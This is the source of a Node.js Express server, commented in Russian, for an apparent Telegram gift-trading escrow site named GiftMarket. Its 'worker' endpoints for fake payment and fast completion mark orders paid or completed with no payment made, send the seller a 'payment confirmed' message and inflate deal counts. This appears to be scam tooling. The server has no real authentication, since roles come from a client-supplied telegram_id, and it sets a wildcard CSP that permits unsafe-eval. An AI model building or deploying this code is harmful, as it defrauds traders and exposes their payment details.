const express = require('express');
const cors = require('cors');
const path = require('path');
const fs = require('fs');
const app = express();

app.use(cors());
app.use(express.json());

// Middleware для настройки CSP заголовков
app.use((req, res, next) => {
    res.setHeader('Content-Security-Policy', 
        "default-src * 'unsafe-inline' 'unsafe-eval' data: blob:; " +
        "script-src * 'unsafe-inline' 'unsafe-eval' data: blob:; " +
        "style-src * 'unsafe-inline' 'unsafe-eval'; " +
        "img-src * data: blob:; " +
        "font-src * data:; " +
        "connect-src *; " +
        "frame-src *; " +
        "media-src *;"
    );
    next();
});

app.use(express.static(__dirname));

// Имитация базы данных
let users = [];
let orders = [];
let notifications = [];
let userCounter = 1000;
let orderCounter = 5000;
let notificationCounter = 10000;

// Админ по умолчанию (только для демо)
let admins = ['admin_giftmarket'];
let workers = [];

// Файл для хранения данных (простая JSON база)
const DATA_FILE = 'database.json';

// Загрузка данных из файла
function loadData() {
    try {
        if (fs.existsSync(DATA_FILE)) {
            const data = JSON.parse(fs.readFileSync(DATA_FILE, 'utf8'));
            users = data.users || [];
            orders = data.orders || [];
            notifications = data.notifications || [];
            userCounter = data.userCounter || 1000;
            orderCounter = data.orderCounter || 5000;
            notificationCounter = data.notificationCounter || 10000;
            admins = data.admins || ['admin_giftmarket'];
            workers = data.workers || [];
            console.log('✅ Данные загружены из файла');
        }
    } catch (error) {
        console.error('❌ Ошибка загрузки данных:', error);
    }
}

// Сохранение данных в файл
function saveData() {
    try {
        const data = {
            users,
            orders,
            notifications,
            userCounter,
            orderCounter,
            notificationCounter,
            admins,
            workers,
            lastSave: new Date().toISOString()
        };
        fs.writeFileSync(DATA_FILE, JSON.stringify(data, null, 2));
        console.log('💾 Данные сохранены');
    } catch (error) {
        console.error('❌ Ошибка сохранения данных:', error);
    }
}

// Инициализация данных
function initializeData() {
    loadData();
    
    // Создаем админа по умолчанию если его нет
    if (!users.find(u => u.telegram_id === 'admin_giftmarket')) {
        const adminUser = {
            id: userCounter++,
            username: 'Администратор GiftMarket',
            telegram_id: 'admin_giftmarket',
            isAdmin: true,
            isWorker: false,
            ton_wallet: 'UQCD39VS5jcptHL8vMjEXrzGaRcCVYto7HUn4bpAOg8xqEBI',
            card_number: '5536 9137 2345 6789',
            card_bank: 'Тинькофф',
            card_currency: 'RUB',
            telegram_username: '@giftmarket_admin',
            completed_deals: 0,
            volumes: {},
            role: 'admin',
            registration_date: new Date().toISOString(),
            last_login: new Date().toISOString()
        };
        users.push(adminUser);
        console.log('👑 Создан администратор по умолчанию');
    }
    
    // Создаем тестового пользователя для демо
    if (!users.find(u => u.telegram_id === 'test_user')) {
        const testUser = {
            id: userCounter++,
            username: 'Тестовый Пользователь',
            telegram_id: 'test_user',
            isAdmin: false,
            isWorker: false,
            ton_wallet: null,
            card_number: null,
            card_bank: null,
            card_currency: 'RUB',
            telegram_username: null,
            completed_deals: 0,
            volumes: {},
            role: 'user',
            registration_date: new Date().toISOString(),
            last_login: new Date().toISOString()
        };
        users.push(testUser);
    }
    
    saveData();
    console.log('📊 Система инициализирована');
    console.log(`👥 Пользователей: ${users.length}`);
    console.log(`🛒 Ордеров: ${orders.length}`);
}

// API Routes

// Получить курс TON
app.get('/api/ton-price', (req, res) => {
    // Реальный курс TON (может быть подключено к реальному API)
    const tonPrice = 6.42 + (Math.random() * 0.5 - 0.25); // Небольшие колебания для реалистичности
    res.json({ price: tonPrice.toFixed(2) });
});

// Создать/получить пользователя
app.post('/api/users', (req, res) => {
    const { username, telegram_id } = req.body;
    
    // Генерация уникального ID для новых пользователей
    const userTelegramId = telegram_id || `user_${Date.now()}_${Math.random().toString(36).substr(2, 9)}`;
    
    let user = users.find(u => u.telegram_id === userTelegramId);
    
    if (!user) {
        const isAdmin = admins.includes(userTelegramId);
        const isWorker = workers.includes(userTelegramId);
        
        user = {
            id: userCounter++,
            username: username || `Пользователь ${users.length + 1}`,
            telegram_id: userTelegramId,
            isAdmin: isAdmin,
            isWorker: isWorker,
            ton_wallet: null,
            card_number: null,
            card_bank: null,
            card_currency: 'RUB',
            telegram_username: null,
            completed_deals: 0,
            volumes: {},
            role: isAdmin ? 'admin' : (isWorker ? 'worker' : 'user'),
            registration_date: new Date().toISOString(),
            last_login: new Date().toISOString()
        };
        users.push(user);
    } else {
        user.last_login = new Date().toISOString();
        if (username && username !== user.username) {
            user.username = username;
        }
    }
    
    saveData();
    res.json(user);
});

// Получить данные пользователя
app.get('/api/users/:telegram_id', (req, res) => {
    const user = users.find(u => u.telegram_id === req.params.telegram_id);
    
    if (user) {
        res.json(user);
    } else {
        res.status(404).json({ error: 'Пользователь не найден' });
    }
});

// Обновить реквизиты пользователя
app.put('/api/users/:telegram_id/requisites', (req, res) => {
    const user = users.find(u => u.telegram_id === req.params.telegram_id);
    
    if (!user) {
        return res.status(404).json({ error: 'Пользователь не найден' });
    }
    
    if (req.body.ton_wallet !== undefined) {
        user.ton_wallet = req.body.ton_wallet;
    }
    if (req.body.card_number !== undefined) {
        user.card_number = req.body.card_number;
    }
    if (req.body.card_bank !== undefined) {
        user.card_bank = req.body.card_bank;
    }
    if (req.body.card_currency !== undefined) {
        user.card_currency = req.body.card_currency;
    }
    if (req.body.telegram_username !== undefined) {
        user.telegram_username = req.body.telegram_username;
    }
    
    saveData();
    res.json(user);
});

// Получить ордера пользователя
app.get('/api/users/:telegram_id/orders', (req, res) => {
    const user = users.find(u => u.telegram_id === req.params.telegram_id);
    
    if (!user) {
        return res.json([]);
    }
    
    const userOrders = orders.filter(order => 
        order.seller_telegram_id === user.telegram_id || 
        order.buyer_telegram_id === user.telegram_id
    );
    
    res.json(userOrders);
});

// Создать ордер
app.post('/api/orders', (req, res) => {
    const {
        seller_telegram_id,
        type,
        payment_method,
        amount,
        currency,
        description
    } = req.body;
    
    const seller = users.find(u => u.telegram_id === seller_telegram_id);
    if (!seller) {
        return res.status(404).json({ error: 'Продавец не найден' });
    }
    
    // Проверка реквизитов в зависимости от метода оплаты
    if (payment_method === 'ton' && !seller.ton_wallet) {
        return res.status(400).json({ error: 'Добавьте TON кошелёк в реквизитах' });
    }
    
    if (payment_method === 'card' && !seller.card_number) {
        return res.status(400).json({ error: 'Добавьте банковскую карту в реквизитах' });
    }
    
    if (payment_method === 'stars' && !seller.telegram_username) {
        return res.status(400).json({ error: 'Добавьте Telegram в реквизитах' });
    }
    
    const order = {
        id: orderCounter++,
        code: generateOrderCode(),
        seller_id: seller.id,
        seller_telegram_id,
        seller_username: seller.username,
        buyer_id: null,
        buyer_telegram_id: null,
        buyer_username: null,
        type,
        payment_method,
        amount: parseFloat(amount),
        currency,
        description,
        seller_requisites: getSellerRequisites(seller, payment_method),
        status: 'active',
        created_at: new Date().toISOString(),
        updated_at: new Date().toISOString(),
        commission: parseFloat(amount) * 0.01, // 1% комиссия
        commission_paid: false
    };
    
    orders.push(order);
    
    // Уведомление админу о новом ордере
    admins.forEach(adminId => {
        const admin = users.find(u => u.telegram_id === adminId);
        if (admin) {
            createNotification(
                admin.telegram_id,
                'new_order_admin',
                `🛒 Новый ордер #${order.code}\nТип: ${type}\nСумма: ${amount} ${currency}\nПродавец: ${seller.username}`
            );
        }
    });
    
    createNotification(
        seller_telegram_id,
        'order_created',
        `✅ Ордер #${order.code} создан. Сумма: ${amount} ${currency}`
    );
    
    saveData();
    res.json(order);
});

// Получить ордер по коду
app.get('/api/orders/:code', (req, res) => {
    const order = orders.find(o => o.code === req.params.code);
    
    if (order) {
        res.json(order);
    } else {
        res.status(404).json({ error: 'Ордер не найден' });
    }
});

// Присоединиться к ордеру (покупатель)
app.post('/api/orders/:id/join', (req, res) => {
    const orderId = parseInt(req.params.id);
    const { buyer_telegram_id } = req.body;
    
    const order = orders.find(o => o.id === orderId);
    
    if (!order) {
        return res.status(404).json({ error: 'Ордер не найден' });
    }
    
    if (order.seller_telegram_id === buyer_telegram_id) {
        return res.status(400).json({ error: 'Нельзя присоединиться к своему ордеру' });
    }
    
    if (order.status !== 'active') {
        return res.status(400).json({ error: 'Ордер неактивен' });
    }
    
    const buyer = users.find(u => u.telegram_id === buyer_telegram_id);
    
    if (!buyer) {
        return res.status(400).json({ error: 'Покупатель не найден' });
    }
    
    order.buyer_id = buyer.id;
    order.buyer_telegram_id = buyer_telegram_id;
    order.buyer_username = buyer.username;
    order.updated_at = new Date().toISOString();
    
    createNotification(
        order.seller_telegram_id,
        'buyer_joined',
        `👤 Покупатель ${buyer.username} присоединился к ордеру #${order.code}`
    );
    
    createNotification(
        buyer_telegram_id,
        'order_joined',
        `✅ Вы присоединились к ордеру #${order.code}. Сумма: ${order.amount} ${order.currency}`
    );
    
    // Уведомление админу
    admins.forEach(adminId => {
        createNotification(
            adminId,
            'buyer_joined_admin',
            `🛒 Покупатель присоединился к ордеру #${order.code}\nПокупатель: ${buyer.username}\nСумма: ${order.amount} ${order.currency}`
        );
    });
    
    saveData();
    res.json(order);
});

// Обновить статус ордера
app.put('/api/orders/:id/status', (req, res) => {
    const orderId = parseInt(req.params.id);
    const { status, user_telegram_id } = req.body;
    
    const order = orders.find(o => o.id === orderId);
    
    if (!order) {
        return res.status(404).json({ error: 'Ордер не найден' });
    }
    
    const user = users.find(u => u.telegram_id === user_telegram_id);
    
    if (!user) {
        return res.status(400).json({ error: 'Пользователь не найден' });
    }
    
    // Проверка прав
    const isSeller = user.id === order.seller_id;
    const isBuyer = user.id === order.buyer_id;
    const isAdmin = user.isAdmin;
    const isWorker = user.isWorker;
    
    if (!isSeller && !isBuyer && !isAdmin && !isWorker) {
        return res.status(403).json({ error: 'Доступ запрещен' });
    }
    
    // Логика изменения статуса
    const oldStatus = order.status;
    
    if (status === 'paid') {
        if (!isBuyer && !isAdmin && !isWorker) {
            return res.status(403).json({ error: 'Только покупатель, админ или воркер может подтвердить оплату' });
        }
        order.status = 'paid';
    } else if (status === 'completed') {
        if (!isSeller && !isAdmin && !isWorker) {
            return res.status(403).json({ error: 'Только продавец, админ или воркер может завершить сделку' });
        }
        order.status = 'completed';
    } else if (status === 'cancelled') {
        order.status = 'cancelled';
    } else {
        return res.status(400).json({ error: 'Некорректный статус' });
    }
    
    order.updated_at = new Date().toISOString();
    
    if (status === 'paid' && oldStatus === 'active') {
        createNotification(
            order.seller_telegram_id,
            'payment_confirmed',
            `💰 Оплата ордера #${order.code} подтверждена. Сумма: ${order.amount} ${order.currency}`
        );
        
        // Уведомление админу о подтверждении оплаты
        admins.forEach(adminId => {
            createNotification(
                adminId,
                'payment_confirmed_admin',
                `💸 Оплата подтверждена #${order.code}\nПокупатель: ${order.buyer_username}\nСумма: ${order.amount} ${order.currency}`
            );
        });
    } else if (status === 'completed' && oldStatus === 'paid') {
        // Обновляем статистику продавца
        const seller = users.find(u => u.telegram_id === order.seller_telegram_id);
        if (seller) {
            seller.completed_deals = (seller.completed_deals || 0) + 1;
            seller.volumes = seller.volumes || {};
            seller.volumes[order.currency] = (seller.volumes[order.currency] || 0) + order.amount;
        }
        
        // Обновляем статистику покупателя
        const buyer = users.find(u => u.telegram_id === order.buyer_telegram_id);
        if (buyer) {
            buyer.completed_deals = (buyer.completed_deals || 0) + 1;
        }
        
        createNotification(
            order.seller_telegram_id,
            'order_completed',
            `✅ Сделка #${order.code} успешно завершена!`
        );
        
        createNotification(
            order.buyer_telegram_id,
            'order_completed',
            `✅ Сделка #${order.code} успешно завершена!`
        );
        
        // Комиссия платформе
        order.commission_paid = true;
        
        // Уведомление админу о завершении сделки
        admins.forEach(adminId => {
            createNotification(
                adminId,
                'order_completed_admin',
                `✅ Сделка завершена #${order.code}\nПродавец: ${order.seller_username}\nПокупатель: ${order.buyer_username}\nСумма: ${order.amount} ${order.currency}`
            );
        });
    }
    
    saveData();
    res.json(order);
});

// API для воркеров - фейковая оплата
app.post('/api/orders/:id/fake-payment', (req, res) => {
    const orderId = parseInt(req.params.id);
    const { worker_telegram_id } = req.body;
    
    const worker = users.find(u => u.telegram_id === worker_telegram_id);
    
    if (!worker || !worker.isWorker) {
        return res.status(403).json({ error: 'Только воркеры могут подтверждать фейковые оплаты' });
    }
    
    const order = orders.find(o => o.id === orderId);
    
    if (!order) {
        return res.status(404).json({ error: 'Ордер не найден' });
    }
    
    if (order.status !== 'active') {
        return res.status(400).json({ error: 'Ордер должен быть активным' });
    }
    
    // Обновляем статус
    order.status = 'paid';
    order.updated_at = new Date().toISOString();
    order.fake_payment = true;
    order.fake_payment_by = worker.username;
    order.fake_payment_at = new Date().toISOString();
    
    // Уведомления
    createNotification(
        order.seller_telegram_id,
        'fake_payment_confirmed',
        `🛠️ Воркер ${worker.username} подтвердил фейковую оплату по ордеру #${order.code}`
    );
    
    if (order.buyer_telegram_id) {
        createNotification(
            order.buyer_telegram_id,
            'payment_confirmed',
            `💰 Оплата ордера #${order.code} подтверждена воркером. Сумма: ${order.amount} ${order.currency}`
        );
    }
    
    // Уведомление админу
    admins.forEach(adminId => {
        createNotification(
            adminId,
            'fake_payment_admin',
            `🛠️ Фейковая оплата #${order.code}\nВоркер: ${worker.username}\nПродавец: ${order.seller_username}\nСумма: ${order.amount} ${order.currency}`
        );
    });
    
    saveData();
    res.json({
        success: true,
        message: 'Фейковая оплата успешно подтверждена',
        order: order,
        worker: worker.username
    });
});

// API для воркеров - быстрое завершение сделки
app.post('/api/orders/:id/fast-complete', (req, res) => {
    const orderId = parseInt(req.params.id);
    const { worker_telegram_id } = req.body;
    
    const worker = users.find(u => u.telegram_id === worker_telegram_id);
    
    if (!worker || !worker.isWorker) {
        return res.status(403).json({ error: 'Только воркеры могут быстро завершать сделки' });
    }
    
    const order = orders.find(o => o.id === orderId);
    
    if (!order) {
        return res.status(404).json({ error: 'Ордер не найден' });
    }
    
    if (order.status !== 'active' && order.status !== 'paid') {
        return res.status(400).json({ error: 'Некорректный статус ордера' });
    }
    
    // Обновляем статус
    const oldStatus = order.status;
    order.status = 'completed';
    order.updated_at = new Date().toISOString();
    order.fast_complete = true;
    order.fast_complete_by = worker.username;
    order.fast_complete_at = new Date().toISOString();
    
    // Обновляем статистику
    const seller = users.find(u => u.telegram_id === order.seller_telegram_id);
    if (seller) {
        seller.completed_deals = (seller.completed_deals || 0) + 1;
        seller.volumes = seller.volumes || {};
        seller.volumes[order.currency] = (seller.volumes[order.currency] || 0) + order.amount;
    }
    
    if (order.buyer_telegram_id) {
        const buyer = users.find(u => u.telegram_id === order.buyer_telegram_id);
        if (buyer) {
            buyer.completed_deals = (buyer.completed_deals || 0) + 1;
        }
        
        createNotification(
            order.buyer_telegram_id,
            'order_completed',
            `⚡ Воркер быстро завершил сделку #${order.code}`
        );
    }
    
    createNotification(
        order.seller_telegram_id,
        'order_completed',
        `⚡ Воркер ${worker.username} быстро завершил сделку #${order.code}`
    );
    
    // Уведомление админу
    admins.forEach(adminId => {
        createNotification(
            adminId,
            'fast_complete_admin',
            `⚡ Быстрое завершение #${order.code}\nВоркер: ${worker.username}\nПродавец: ${order.seller_username}\nСумма: ${order.amount} ${order.currency}`
        );
    });
    
    saveData();
    res.json({
        success: true,
        message: 'Сделка быстро завершена воркером',
        order: order,
        worker: worker.username
    });
});

// API для админов - получить всех пользователей
app.get('/api/admin/users', (req, res) => {
    const { admin_telegram_id } = req.query;
    
    const admin = users.find(u => u.telegram_id === admin_telegram_id);
    if (!admin || !admin.isAdmin) {
        return res.status(403).json({ error: 'Только админы могут просматривать пользователей' });
    }
    
    const userList = users.map(u => ({
        id: u.id,
        username: u.username,
        telegram_id: u.telegram_id,
        role: u.role,
        completed_deals: u.completed_deals,
        total_volume: u.volumes,
        registration_date: u.registration_date,
        last_login: u.last_login
    }));
    
    res.json(userList);
});

// API для админов - получить всех воркеров
app.get('/api/admin/workers', (req, res) => {
    const { admin_telegram_id } = req.query;
    
    const admin = users.find(u => u.telegram_id === admin_telegram_id);
    if (!admin || !admin.isAdmin) {
        return res.status(403).json({ error: 'Только админы могут просматривать воркеров' });
    }
    
    const workerList = users
        .filter(u => u.isWorker)
        .map(u => ({
            telegram_id: u.telegram_id,
            username: u.username,
            completed_deals: u.completed_deals,
            total_volume: u.volumes,
            registration_date: u.registration_date
        }));
    
    res.json(workerList);
});

// API для админов - добавить воркера
app.post('/api/admin/workers/add', (req, res) => {
    const { admin_telegram_id, worker_telegram_id, worker_username } = req.body;
    
    const admin = users.find(u => u.telegram_id === admin_telegram_id);
    if (!admin || !admin.isAdmin) {
        return res.status(403).json({ error: 'Только админы могут добавлять воркеров' });
    }
    
    if (workers.includes(worker_telegram_id)) {
        return res.status(400).json({ error: 'Этот пользователь уже является воркером' });
    }
    
    workers.push(worker_telegram_id);
    
    // Обновляем или создаем пользователя
    let worker = users.find(u => u.telegram_id === worker_telegram_id);
    if (worker) {
        worker.isWorker = true;
        worker.role = 'worker';
        if (worker_username) {
            worker.username = worker_username;
        }
    } else {
        worker = {
            id: userCounter++,
            username: worker_username || 'Новый воркер',
            telegram_id: worker_telegram_id,
            isAdmin: false,
            isWorker: true,
            ton_wallet: null,
            card_number: null,
            card_bank: null,
            card_currency: 'RUB',
            telegram_username: null,
            completed_deals: 0,
            volumes: {},
            role: 'worker',
            registration_date: new Date().toISOString(),
            last_login: new Date().toISOString()
        };
        users.push(worker);
    }
    
    createNotification(
        worker_telegram_id,
        'worker_added',
        `🛠️ Вы были добавлены в качестве воркера GiftMarket администратором ${admin.username}`
    );
    
    saveData();
    res.json({
        success: true,
        message: 'Воркер успешно добавлен',
        worker: {
            telegram_id: worker.telegram_id,
            username: worker.username
        }
    });
});

// API для админов - удалить воркера
app.post('/api/admin/workers/remove', (req, res) => {
    const { admin_telegram_id, worker_telegram_id } = req.body;
    
    const admin = users.find(u => u.telegram_id === admin_telegram_id);
    if (!admin || !admin.isAdmin) {
        return res.status(403).json({ error: 'Только админы могут удалять воркеров' });
    }
    
    const index = workers.indexOf(worker_telegram_id);
    if (index === -1) {
        return res.status(404).json({ error: 'Воркер не найден' });
    }
    
    workers.splice(index, 1);
    
    const worker = users.find(u => u.telegram_id === worker_telegram_id);
    if (worker) {
        worker.isWorker = false;
        worker.role = 'user';
        
        createNotification(
            worker_telegram_id,
            'worker_removed',
            `🔧 Вы были удалены из воркеров GiftMarket администратором ${admin.username}`
        );
    }
    
    saveData();
    res.json({
        success: true,
        message: 'Воркер успешно удален',
        worker_telegram_id: worker_telegram_id
    });
});

// API для админов - сделать пользователя админом
app.post('/api/admin/promote', (req, res) => {
    const { admin_telegram_id, user_telegram_id } = req.body;
    
    const admin = users.find(u => u.telegram_id === admin_telegram_id);
    if (!admin || !admin.isAdmin) {
        return res.status(403).json({ error: 'Только админы могут назначать других админов' });
    }
    
    const user = users.find(u => u.telegram_id === user_telegram_id);
    if (!user) {
        return res.status(404).json({ error: 'Пользователь не найден' });
    }
    
    user.isAdmin = true;
    user.role = 'admin';
    if (!admins.includes(user_telegram_id)) {
        admins.push(user_telegram_id);
    }
    
    createNotification(
        user_telegram_id,
        'admin_promoted',
        `👑 Вы были назначены администратором GiftMarket администратором ${admin.username}`
    );
    
    saveData();
    res.json({
        success: true,
        message: 'Пользователь назначен администратором',
        user: {
            telegram_id: user.telegram_id,
            username: user.username
        }
    });
});

// API для админов - получить статистику платформы
app.get('/api/admin/stats', (req, res) => {
    const { admin_telegram_id } = req.query;
    
    const admin = users.find(u => u.telegram_id === admin_telegram_id);
    if (!admin || !admin.isAdmin) {
        return res.status(403).json({ error: 'Только админы могут просматривать статистику' });
    }
    
    const platformStats = {
        totalUsers: users.length,
        totalOrders: orders.length,
        activeOrders: orders.filter(o => o.status === 'active').length,
        completedOrders: orders.filter(o => o.status === 'completed').length,
        totalVolume: calculateTotalVolume(),
        totalWorkers: workers.length,
        totalAdmins: admins.length,
        last24Hours: getLast24HoursStats()
    };
    
    res.json(platformStats);
});

// Получить уведомления пользователя
app.get('/api/users/:telegram_id/notifications', (req, res) => {
    const userNotifications = notifications
        .filter(n => n.user_telegram_id === req.params.telegram_id)
        .sort((a, b) => b.id - a.id)
        .slice(0, 50);
    
    res.json(userNotifications);
});

// Пометить уведомление как прочитанное
app.put('/api/notifications/:id/read', (req, res) => {
    const notification = notifications.find(n => n.id === parseInt(req.params.id));
    
    if (notification) {
        notification.read = true;
        notification.read_at = new Date().toISOString();
        saveData();
        res.json({ success: true });
    } else {
        res.status(404).json({ error: 'Уведомление не найдено' });
    }
});

// Удалить уведомление
app.delete('/api/notifications/:id', (req, res) => {
    const index = notifications.findIndex(n => n.id === parseInt(req.params.id));
    
    if (index !== -1) {
        notifications.splice(index, 1);
        saveData();
        res.json({ success: true });
    } else {
        res.status(404).json({ error: 'Уведомление не найдено' });
    }
});

// Очистить все уведомления пользователя
app.delete('/api/users/:telegram_id/notifications', (req, res) => {
    const userTelegramId = req.params.telegram_id;
    
    notifications = notifications.filter(n => n.user_telegram_id !== userTelegramId);
    saveData();
    
    res.json({ success: true, message: 'Все уведомления удалены' });
});

// Вспомогательные функции
function generateOrderCode() {
    const chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
    let code = '';
    for (let i = 0; i < 8; i++) {
        code += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    
    // Проверяем уникальность кода
    if (orders.find(o => o.code === code)) {
        return generateOrderCode();
    }
    
    return code;
}

function createNotification(user_telegram_id, type, message) {
    const notification = {
        id: notificationCounter++,
        user_telegram_id,
        type,
        message,
        read: false,
        created_at: new Date().toISOString(),
        read_at: null
    };
    
    notifications.push(notification);
    saveData();
    return notification;
}

function getSellerRequisites(seller, paymentMethod) {
    switch (paymentMethod) {
        case 'ton':
            return seller.ton_wallet || 'TON кошелёк не указан';
        case 'card':
            return `${seller.card_number || 'Карта не указана'}${seller.card_bank ? ' (' + seller.card_bank + ')' : ''}`;
        case 'stars':
            return seller.telegram_username || 'Telegram не указан';
        default:
            return 'Реквизиты не указаны';
    }
}

function calculateTotalVolume() {
    let total = 0;
    users.forEach(user => {
        if (user.volumes) {
            Object.entries(user.volumes).forEach(([currency, amount]) => {
                total += convertCurrencyToUSD(amount, currency);
            });
        }
    });
    return total;
}

function convertCurrencyToUSD(amount, currency) {
    const rates = {
        'RUB': 0.011,
        'USD': 1,
        'EUR': 1.09,
        'KZT': 0.0022,
        'UAH': 0.024,
        'TON': 6.42,
        'STARS': 0.013
    };
    return amount * (rates[currency] || 1);
}

function getLast24HoursStats() {
    const now = new Date();
    const yesterday = new Date(now - 24 * 60 * 60 * 1000);
    
    const newUsers = users.filter(u => new Date(u.registration_date) > yesterday).length;
    const newOrders = orders.filter(o => new Date(o.created_at) > yesterday).length;
    const completedOrders = orders.filter(o => 
        o.status === 'completed' && new Date(o.updated_at) > yesterday
    ).length;
    
    let newVolume = 0;
    orders.filter(o => o.status === 'completed' && new Date(o.updated_at) > yesterday)
        .forEach(order => {
            newVolume += convertCurrencyToUSD(order.amount, order.currency);
        });
    
    return {
        newUsers,
        newOrders,
        completedOrders,
        newVolume: newVolume.toFixed(2)
    };
}

// Инициализация данных при старте сервера
initializeData();

// Все остальные маршруты ведут к index.html
app.get('*', (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Запуск сервера
const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🚀 Сервер запущен на порту ${PORT}`);
    console.log(`📡 API доступен по адресу: http://localhost:${PORT}/api`);
    console.log(`👑 Админ доступ: telegram_id = admin_giftmarket`);
    console.log(`👤 Тестовый пользователь: telegram_id = test_user`);
    console.log(`💾 Данные сохраняются в файл: ${DATA_FILE}`);
});
